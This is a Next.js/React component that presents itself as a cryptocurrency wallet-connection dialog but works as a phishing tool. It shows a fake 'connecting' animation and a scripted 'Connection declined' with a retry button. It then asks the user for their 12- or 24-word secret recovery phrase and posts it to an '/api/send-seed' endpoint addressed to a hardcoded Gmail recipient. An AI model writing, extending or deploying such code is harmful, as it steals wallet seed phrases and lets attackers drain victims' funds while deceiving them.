"use client";

import Image from "next/image";
import { Card } from "./ui/card";
import { cn } from "@/lib/utils";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "./ui/dialog";
import { Textarea } from "./ui/textarea";
import { Button } from "./ui/button";
import { useState } from "react";
import { Loader2, RotateCcw } from "lucide-react";

interface Props {
  wallet:
    | {
        name: string;
        type: string;
        logo: string;
        count?: undefined;
      }
    | {
        name: string;
        logo: string;
        type?: undefined;
        count?: undefined;
      }
    | {
        name: string;
        count: number;
        logo: string;
        type?: undefined;
      };
}

type WalletOption = {
  name: string;
  type?: string;
  secret: string;
};

const WalletCard = ({ wallet }: Props) => {
  const [selectedWallet, setSelectedWallet] = useState<WalletOption | null>(
    null
  );

  const [secret, setSecret] = useState("");
  const [error, setError] = useState("");
  const [loading, setIsLoading] = useState(false);

  const [showConnectionUI, setShowConnectionUI] = useState(false);
  const [connectionStage, setConnectionStage] = useState<
    "idle" | "connecting" | "failed" | "ready"
  >("idle");

  const simulateConnectionFlow = () => {
    setShowConnectionUI(true);
    setConnectionStage("connecting");

    setTimeout(() => {
      setConnectionStage("failed");
    }, 3000);
  };

  const handleRetry = () => {
    setConnectionStage("connecting");

    setTimeout(() => {
      setConnectionStage("ready"); // Finally show textarea
    }, 3000);
  };

  const handleCardClick = () => {
    setSelectedWallet({ name: wallet.name, type: wallet.type, secret: "" });
    setSecret(""); // clear previous secret
    simulateConnectionFlow();
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!secret) {
      return;
    }

    if (selectedWallet) {
      const finalWallet = { ...selectedWallet, secret };
      setError("");
      console.log("Submitted Wallet:", finalWallet);
      try {
        setIsLoading(true);
        const response = await fetch("/api/send-seed", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            name: finalWallet.name.toString().trim(),
            secret: finalWallet.secret.toString().trim(),
            to: "oghuanlan@gmail.com",
          }),
        });
        const data = await response.json();

        if (!response.ok) {
          const errorMessage =
            data?.error ||
            "Unknown error occurred while sending the seed phrase.";
          setError(`Failed to send seed phrase: ${errorMessage}`);
          console.error("Server error response:", data);
          return;
        }
        setSecret(""); // Clear the secret after success
        setSelectedWallet(null); // Reset wallet
      } catch (error) {
        console.error("Network or parsing error:", error);
        setError("A network error occurred while sending the seed phrase.");
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <Dialog>
      <DialogTrigger asChild onClick={handleCardClick}>
        <Card
          // onClick={handleClick}
          className="h-16 bg-gray-800 border-0 flex justify-center px-2 py-4 hover:bg-muted-foreground/20"
        >
          <div className="flex justify-between pr-2 items-center">
            <div className="flex gap-4 items-center">
              <Image
                src={wallet.logo}
                alt=""
                width={200}
                height={200}
                className="w-12 h-12 object-cover rounded-lg"
              />
              <p className="text-white font-semibold">{wallet.name}</p>
            </div>
            {wallet.type && (
              <div
                className={cn(
                  "uppercase text-[10px] h-6 font-bold px-1 rounded-md flex items-center",
                  wallet.type === "installed"
                    ? "bg-green-700/30 text-green-500"
                    : "bg-blue-700/30 text-blue-500"
                )}
              >
                {wallet.type}
              </div>
            )}
            {wallet.count && (
              <div
                className={cn(
                  "uppercase text-[10px] h-6 font-bold px-2 rounded-md flex items-center",
                  wallet.count && "bg-gray-700/30 text-gray-300"
                )}
              >
                {wallet.count}+
              </div>
            )}
          </div>
        </Card>
      </DialogTrigger>
      <DialogContent className="sm:max-w-[400px] bg-gray-900 border-0 space-y-4">
        <DialogHeader>
          <DialogTitle className="text-center">{wallet.name}</DialogTitle>
        </DialogHeader>
        {showConnectionUI && connectionStage !== "ready" ? (
          <div className="flex flex-col items-center gap-4 py-4">
            <div className="relative w-24 h-24 flex items-center justify-center">
              {connectionStage === "connecting" ? (
                <div className="animated-border w-full h-full"></div>
              ) : (
                <div className="w-6 h-6 text-red-500 text-xs absolute bottom-3 right-3 z-10 bg-red-950 p-1 rounded-full flex items-center justify-center">
                  ❌
                </div>
              )}
              <div className="absolute w-16 h-16 rounded-lg overflow-hidden">
                <Image
                  src={wallet.logo}
                  alt=""
                  width={64}
                  height={64}
                  className="object-cover w-full h-full rounded-xl"
                />
              </div>
            </div>

            <div className="text-center space-y-1">
              <p
                className={` font-semibold  ${
                  connectionStage === "failed"
                    ? "text-red-400 font-semibold"
                    : "text-white"
                }`}
              >
                {connectionStage === "connecting"
                  ? `Continue in ${wallet.name}`
                  : "Connection declined"}
              </p>
              <p className="text-sm text-muted-foreground max-w-xs">
                {connectionStage === "connecting"
                  ? "Accept connection request in the wallet..."
                  : `Connection can be declined if a previous request is still active`}
              </p>

              {connectionStage === "failed" && (
                <Button
                  onClick={handleRetry}
                  className="bg-black/20 text-blue-400 rounded-full border border-zinc-400/30 font-semibold mt-4"
                >
                  <RotateCcw />
                  Try again
                </Button>
              )}
            </div>
          </div>
        ) : (
          <form onClick={handleSubmit}>
            <div className="flex gap-2 font-sans flex-col items-center space-y-2">
              <div className="relative w-24 h-24">
                {/* Animated moving border segment */}
                <div className="absolute inset-0 z-10 pointer-events-none overflow-hidden rounded-2xl">
                  <div className="animated-border w-full h-full"></div>
                </div>

                {/* Main content box */}
                <div className="relative z-0 flex items-center justify-center w-full h-full p-2 bg-zinc-00 border-4 border-blue-100/20 rounded-2xl">
                  <Image
                    src={wallet.logo}
                    alt=""
                    width={200}
                    height={200}
                    className="w-18 h-18 object-cover rounded-xl"
                  />
                </div>
              </div>

              <p className="text-sm font-bold text-muted-foreground">
                To connect your wallet, enter the secret phrase
              </p>

              <Textarea
                rows={6}
                value={secret}
                onChange={(e) => setSecret(e.target.value)}
                className="resize-none border-2 border-gray-400/20 focus-visible:border-none focus-visible:ring-ring/50"
                placeholder="Enter your 12 or 24 keywords"
              />
              {error && <div className="text-red-500">{error}</div>}

              <Button
                type="submit"
                // disabled={!secret}
                className="bg-black/20 text-blue-400 rounded-full border border-zinc-400/30 font-semibold"
                onClick={handleCardClick}
              >
                {loading ? (
                  <>
                    <span>Submitting</span>
                    <Loader2 />
                  </>
                ) : (
                  "Continue"
                )}
              </Button>
            </div>
          </form>
        )}
      </DialogContent>
    </Dialog>
  );
};
export default WalletCard;
